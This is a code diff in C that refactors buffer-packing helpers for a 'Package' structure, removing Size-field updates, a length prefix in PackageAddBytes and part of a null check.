@@ -61,8 +61,7 @@ VOID PackageAddInt32(
 
     Int32ToBuffer( Package->Buffer + Package->Length, Data );
 
-    Package->Size   =   Package->Length;
-    Package->Length +=  sizeof( UINT32 );
+    Package->Length += sizeof( UINT32 );
 }
 
 VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
@@ -79,7 +78,6 @@ VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
 
     Int64ToBuffer( Package->Buffer + Package->Length, dataInt );
 
-    Package->Size   =  Package->Length;
     Package->Length += sizeof( UINT64 );
 }
 
@@ -101,14 +99,13 @@ VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
 
     MemCopy( Package->Buffer + ( Package->Length ), Data, Size );
 
-    Package->Size   =  Package->Length;
     Package->Length += Size;
 }
 
 
 VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
 {
-    if ( ! Package && Size ) {
+    if ( ! Package ) {
         return;
     }
 
@@ -122,11 +119,8 @@ VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
             LMEM_MOVEABLE | LMEM_ZEROINIT
         );
 
-        Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );
-
         MemCopy( Package->Buffer + Package->Length, Data, Size );
 
-        Package->Size   =  Package->Length;
         Package->Length += Size;
     }
 }
